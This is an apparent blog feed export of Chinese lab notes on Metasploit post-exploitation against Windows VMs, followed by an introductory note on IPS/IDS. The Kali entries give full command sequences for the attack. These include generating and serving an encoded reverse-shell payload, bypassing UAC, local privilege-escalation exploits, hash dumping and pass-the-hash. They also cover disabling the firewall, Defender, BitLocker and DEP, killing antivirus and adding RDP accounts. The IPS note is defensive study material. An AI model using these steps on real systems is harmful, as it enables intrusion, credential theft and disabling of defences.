<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load incognito</code></strong><ul>
<li>使用伪装Token需要提权为本地SYSTEM权限</li>
<li>查看组的Token：<strong><code>🔺命令：list_tokens -u</code></strong></li>
<li>伪装Token：<strong><code>🔺命令：impersonate_token lab\\administrator</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：execute -f cmd.exe -i -t</code></strong> # -t：使用当前假冒token执行程序</li>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li><strong><code>🔺命令：net user a a /add</code></strong>（增加账号尝试）</li>
</ul>
</li>
</ul>
</li>
<li>▲ 本地普通权限用户需先本地提权<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms10_015_kitrap0d</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权</title>
    <url>/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<hr>
<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
<li>已经获得目标系统控制权后扩大战果<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li>实验环境<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -l</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：load priv</code></strong> </li>
<li><strong><code>🔺命令：getsystem</code></strong> <ul>
<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-绕过UAC限制-1"><a href="#4-绕过UAC限制-1" class="headerlink" title="4. 绕过UAC限制-1"></a>4. 绕过UAC限制-1</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ask</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set filename 欺骗性的文件名.exe</code></strong><ul>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>UAC → 是</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到更高权限</li>
<li><strong><code>🔺命令：session -i 2</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
</ul>
</li>
</ul>
<h4 id="5-绕过UAC限制-2"><a href="#5-绕过UAC限制-2" class="headerlink" title="5. 绕过UAC限制-2"></a>5. 绕过UAC限制-2</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/bypassuac</code></strong>（EXE执行程序）<ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看是否弹窗</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
</ul>
</li>
<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
</ul>
<h4 id="6-绕过UAC限制-3"><a href="#6-绕过UAC限制-3" class="headerlink" title="6. 绕过UAC限制-3"></a>6. 绕过UAC限制-3</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看是否弹窗</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
</ul>
</li>
<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
</ul>
<h4 id="7-UAC利用"><a href="#7-UAC利用" class="headerlink" title="7. UAC利用"></a>7. UAC利用</h4><ul>
<li>▲ 需要提前关闭UAC</li>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：load priv</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：hashdump</code></strong><ul>
<li>▲ 2020.03.03 Operation failed：The parameter is incorrect</li>
<li>▲ 2020.03.03 run post/windows/gather/hashdump调用不一定能行</li>
<li>▲ 2020.03.03 在非Meterpreter下，<strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>，可在非SYSTEM权限下成功获取到哈希值</li>
</ul>
</li>
<li><strong><code>🔺命令：shell</code></strong>（添加注册表键值，关闭UAC验证）<ul>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong></li>
<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong><ul>
<li><strong><code>🔺命令：shutdown -r -t 0</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>确认UAC功能是否关闭</li>
<li>▲ 查看UAC方法（Win7）：开始 → 控制面板 → 查看方式：大图标 → 操作中心 → 更改用户账户控制设置</li>
</ul>
</li>
<li>Kali<ul>
<li>Psexec模块之 Passthehash<ul>
<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
<li><strong><code>🔺命令：set rhost Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：set smbuser w7</code></strong></li>
<li><strong><code>🔺命令：set smbpass 取得的hash值密文</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>hash值root:toor(aad3b435b51404eeaad3b435b51404ee:3bdfee3835ee03d4283d4569ec1263e4:::)</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.03 该模块包报错，UnexpectedStatusCode STATUS_USER_SESSION_DELETED</li>
</ul>
</li>
<li>Window 7<ul>
<li>开启防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>关闭防火墙<ul>
<li>需要管理员或system权限</li>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li><strong><code>🔺命令：netsh advfirewall set allprofiles state off</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看防火墙是否被关闭</li>
<li>Win+R → services.msc → 查看Windefend是否开启状态</li>
</ul>
</li>
<li>Kali<ul>
<li>关闭Windefend<ul>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li><strong><code>🔺命令：net stop windefend</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看Windefend是否被关闭</li>
<li>关闭远程桌面服务</li>
</ul>
</li>
<li>Kali<ul>
<li>Bitclock磁盘加密<ul>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li>关闭Bitclock加密：<strong><code>🔺命令：manage-bde -off C:</code></strong> </li>
<li>查看Bitclokc加密状态：<strong><code>🔺命令：manage-bde -status C:</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>关闭DEP<ul>
<li>**`🔺命令：shell<ul>
<li><strong><code>🔺命令：bcdedit.exe /set {current} nx AlwaysOff</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>杀死防病毒软件<ul>
<li><strong><code>🔺命令：run killav</code></strong> </li>
<li><strong><code>🔺命令：run post/windows/manage/killav</code></strong></li>
</ul>
</li>
<li>开启远程桌面服务<ul>
<li><strong><code>🔺命令：run post/windows/manage/enable_rdp</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看远程桌面是否被开启</li>
</ul>
</li>
<li>Kali<ul>
<li>关闭远程桌面服务<ul>
<li><strong><code>🔺命令：run multi_console_command -rc /root/.msf4/logs/scripts/getgui/ clean_up__20160824.1855.rc</code></strong> </li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>查看远程桌面是否被关闭</li>
</ul>
</li>
<li>Kali<ul>
<li>开启远程桌面GUI服务：<strong><code>🔺命令：run getgui –e</code></strong></li>
<li>添加用户账号：<strong><code>🔺命令：run getgui -u yuanfh -p pass</code></strong></li>
<li>查看远程桌面<ul>
<li>截图：<strong><code>🔺命令：screenshot</code></strong></li>
<li><strong><code>🔺命令：use/load espia</code></strong> <ul>
<li><strong><code>🔺命令：help</code></strong></li>
<li><strong><code>🔺命令：screengrab</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零六)：MSF后渗透测试--漏洞提权</title>
    <url>/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<hr>
<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
<li>已经获得目标系统控制权后扩大战果<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li>实验环境<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -l</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：load priv</code></strong> </li>
<li><strong><code>🔺命令：getsystem</code></strong> <ul>
<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-利用漏洞直接提权为system-1"><a href="#4-利用漏洞直接提权为system-1" class="headerlink" title="4. 利用漏洞直接提权为system-1"></a>4. 利用漏洞直接提权为system-1</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms13_053_schlamperei</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
</ul>
</li>
</ul>
<h4 id="5-利用漏洞直接提权为system-2"><a href="#5-利用漏洞直接提权为system-2" class="headerlink" title="5. 利用漏洞直接提权为system-2"></a>5. 利用漏洞直接提权为system-2</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms13_081_track_popup_menu</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
</ul>
</li>
</ul>
<h4 id="6-利用漏洞直接提权为system-3"><a href="#6-利用漏洞直接提权为system-3" class="headerlink" title="6. 利用漏洞直接提权为system-3"></a>6. 利用漏洞直接提权为system-3</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms13_097_ie_registry_symlink</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Not-vulnerable;Not running inside an Internet Explorer process</li>
</ul>
</li>
</ul>
<h4 id="7-利用漏洞直接提权为system-4"><a href="#7-利用漏洞直接提权为system-4" class="headerlink" title="7. 利用漏洞直接提权为system-4"></a>7. 利用漏洞直接提权为system-4</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ppr_flatten_rec</code></strong> <ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>IPS笔记-1：IPS基础</title>
    <url>/2020/03/02/IPS%E7%AC%94%E8%AE%B0-1%EF%BC%9AIPS%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<hr>
<h4 id="1-一个真实的蠕虫攻击"><a href="#1-一个真实的蠕虫攻击" class="headerlink" title="1. 一个真实的蠕虫攻击"></a>1. 一个真实的蠕虫攻击</h4><ul>
<li>扫描，发现主机</li>
<li>向目标主机发送溢出报文，控制目标机</li>
<li>获取目标机控制权</li>
<li>目标机发攻击<ul>
<li>向新受害者发起攻击，最终形成规模攻击</li>
<li>将真正攻击者隐藏，增加追查难度</li>
</ul>
</li>
<li>▲ 蠕虫病毒具有自传播性，可以感染整个内网，不同于其他的病毒</li>
</ul>
<p><img src="/images/ips/ips-notepad/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB.png" srcset="/img/loading.gif" alt="蠕虫病毒攻击"></p>
<p><img src="/images/ips/ips-notepad/%E5%95%86%E4%B8%9A%E5%8C%96%E9%98%B2%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png" srcset="/img/loading.gif" alt="商业化防攻击解决方案"></p>
<h4 id="2-IDS产品"><a href="#2-IDS产品" class="headerlink" title="2. IDS产品"></a>2. IDS产品</h4><ul>
<li>IDS定义：Intrusion Detection System，入侵检测系统<ul>
<li>An intrusion detection system has the capability to <strong>detect</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IDS的两个关键特征<ul>
<li>实现应用层威胁识别，提供对网络数据的“监视功能”</li>
<li>旁路部署，与防火墙配合实现安全防范</li>
</ul>
</li>
<li>IDS优势<ul>
<li>IDS不影响网络</li>
<li>IDS的损坏不会影响到网络的功能</li>
<li>一旦超过了IDS的处理能力不会影响到网络流量，虽然这些数据不能够被IDS分析</li>
</ul>
</li>
<li>IDS问题<ul>
<li>IDS response action不能够阻止初始化包，也不能够保证阻止一个连接，IDS的响应技术能够比较好的阻止一个攻击者而不是一个攻击（Reset，Block）</li>
<li>IDS更容易受到网络逃避技术的攻击</li>
</ul>
</li>
<li><strong>注意</strong><ul>
<li>▲ IDS一般用于全流量镜像分析</li>
</ul>
</li>
</ul>
<h4 id="3-IPS产品"><a href="#3-IPS产品" class="headerlink" title="3. IPS产品"></a>3. IPS产品</h4><ul>
<li>IPS定义：Intrusion Prevention System，入侵防御系统<ul>
<li>An intrusion detection system has the capability to <strong>detect and prevent</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IPS的两个关键特征<ul>
<li>深入七层的数据流攻击特征检测<ul>
<li>蠕虫、基于Web的攻击、利用漏洞的攻击、网页篡改、木马、病毒、P2P滥用、DoS/DDoS等</li>
</ul>
</li>
<li>在线部署，实时阻断攻击</li>
</ul>
</li>
<li>IPS优势<ul>
<li>IPS deny action能够阻止触发包，后续数据包，或者所有源至于攻击者的包</li>
<li>IPS能够使用流量规范化技术，减少或者消除很多网络逃避技术</li>
<li>IPS能够有效的阻止蠕虫</li>
</ul>
</li>
<li>IPS问题<ul>
<li>IPS的错误或者损坏会影响到网络的流量</li>
<li>一旦超过了IPS的处理能力，会影响到网络的正常工作</li>
<li>IPS会影响到对时间敏感的运用程序，例如VOIP</li>
</ul>
</li>
<li>衡量IPS的标准<ul>
<li>False positive（错报）</li>
<li>False negative（漏报）</li>
</ul>
</li>
<li>⭐ IPS三种接口类型<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入<ul>
<li>IPS工作模式</li>
</ul>
</li>
</ul>
</li>
<li>Promiscuous-Mode Protection：IDS</li>
<li>Inline-Mode Protection：IPS</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS--IDS%E9%83%A8%E7%BD%B2.png" srcset="/img/loading.gif" alt="IPS--IDS部署"></p>
<p><img src="/images/ips/ips-notepad/IPS--IPS%E9%83%A8%E7%BD%B2.png" srcset="/img/loading.gif" alt="IPS--IPS部署"></p>
<ul>
<li><strong>注意</strong>：<ul>
<li>▲ 可以单一部署IPS</li>
<li>▲ IPS可以类比于外部的AV查杀软件</li>
</ul>
</li>
</ul>
<h4 id="4-IPS-IDS技术发展历程"><a href="#4-IPS-IDS技术发展历程" class="headerlink" title="4. IPS/IDS技术发展历程"></a>4. IPS/IDS技术发展历程</h4><ul>
<li>1987年，入侵安全检测专家系统模型的提出</li>
<li>1988年，Morris蠕虫的爆发，促进了IDS开发研制</li>
<li>1990年，网络IDS–NSM（网络安全监视）用来检测所监视的广域网的网络流量的可疑行为</li>
<li>1998年，开源IDS：Snort</li>
<li>2000年，非IDS厂商提出IPS概念，并发布产品</li>
<li>2003年，主流开始使用IPS</li>
</ul>
<h4 id="5-IPS、IDS、防火墙"><a href="#5-IPS、IDS、防火墙" class="headerlink" title="5. IPS、IDS、防火墙"></a>5. IPS、IDS、防火墙</h4><ul>
<li>在网络环境中，FW、IPS一前一后部署，形成纵深的立体防御</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%AF%94%E8%BE%83.png" srcset="/img/loading.gif" alt="IPS与防火墙的比较"></p>
<ul>
<li>由于IDS与生俱来的缺陷，IPS必将全面取代IDS。DPtech IPS 2000可以同时实现IPS/IDS</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E4%B8%8EIDS%E7%9A%84%E6%AF%94%E8%BE%83.png" srcset="/img/loading.gif" alt="IPS与IDS的比较"></p>
<ul>
<li>防火墙主要提供安全区域隔离、访问控制和VPN功能、不能有效检测并阻断夹杂在正常流量中的应用层攻击代码<ul>
<li>DMZ区域对外提供服务</li>
</ul>
</li>
<li>IDS由于旁路部署，侧重安全状态监控，需要和防火墙联动才能抵御威胁，适用于“事后审计”，无法满足实时安全防护</li>
<li>IPS在线部署、主动防御、实时阻断攻击</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E3%80%81IDS%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99.png" srcset="/img/loading.gif" alt="IPS、IDS、防火墙"></p>
<h4 id="6-⭐-技术介绍"><a href="#6-⭐-技术介绍" class="headerlink" title="6. ⭐ 技术介绍"></a>6. ⭐ 技术介绍</h4><ul>
<li>Profile-Based Intrustion Detection<ul>
<li>特点：定义正常流量，其余均为非法流量</li>
<li>优点：黑客很难判断什么是合法流量，能够发现最新的还没被公布的攻击</li>
<li>缺点：很难规定正常流量，告警很难理解，错误误报很多</li>
<li>产品：主机IPS（CSA）</li>
</ul>
</li>
<li>Signature-Based Intrusion Detection<ul>
<li>特点：通过Signaure（特性代码）匹配攻击</li>
<li>优点：架构很容易，告警很容易理解，能够自定义Sig</li>
<li>缺点：不能检测未被公布的攻击，需要经常升级，需要Cache流量</li>
<li>产品：网络IPS（4215，4240….）</li>
</ul>
</li>
<li>Protocol Analysis<ul>
<li>特点：基于RFC或者安全规范监控协议</li>
<li>产品：防火墙的运用层监控</li>
</ul>
</li>
</ul>
<h4 id="7-⭐-躲避手段"><a href="#7-⭐-躲避手段" class="headerlink" title="7. ⭐ 躲避手段"></a>7. ⭐ 躲避手段</h4><ul>
<li>Flooding（泛洪攻击）<ul>
<li>逃避手段：制造大量超出IPS处理能力的流量，掩护非法流量穿越IPS</li>
</ul>
</li>
<li>Frametation（分片）<ul>
<li>逃避手段：制造大量分片耗尽IPS缓存，实施对IPS的DoS，掩护非法分片流量</li>
</ul>
</li>
<li>Encryption（加密）<ul>
<li>逃避手段：加密攻击流量</li>
<li>例如：通过木马控制客户端发起加密流量到攻击者</li>
</ul>
</li>
<li>Obfuscation（困惑）<ul>
<li>逃避手段：攻击者通过不同的编码方式来逃避IPS检测</li>
<li>例如：@法#轮￥功%</li>
</ul>
</li>
</ul>
<h4 id="8-Cisco-4240"><a href="#8-Cisco-4240" class="headerlink" title="8. Cisco 4240"></a>8. Cisco 4240</h4><ul>
<li>Cisco 4240正面板<ul>
<li>Cisco的IPS与防火墙外观相同，仅简介不同</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Cisco%E6%AD%A3%E9%9D%A2%E6%9D%BF.png" srcset="/img/loading.gif" alt="Cisco正面板"></p>
<ul>
<li>Cisco 4240背面板<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Cisco%E8%83%8C%E9%9D%A2%E6%9D%BF.png" srcset="/img/loading.gif" alt="Cisco背面板"></p>
<h4 id="9-实验"><a href="#9-实验" class="headerlink" title="9. 实验"></a>9. 实验</h4><ul>
<li>GNS3 0.8.6（傻瓜式安装）<ul>
<li>需要安装Winpcap 4.1.3</li>
<li>需要安装Wireshark 1.10.2（32bit）</li>
<li>导入ISO<ul>
<li>Edit → IOS and Hypervisors → Image file → bin文件 → save</li>
<li>导入路径不能有中文字符</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/GNS3%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="GNS3配置成功"></p>
<p><img src="/images/ips/ips-notepad/GNS%E5%AF%BC%E5%85%A5%E9%95%9C%E5%83%8F%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="GNS导入镜像成功"></p>
<ul>
<li>SecureCRT_6.5.3.490（傻瓜式安装）<ul>
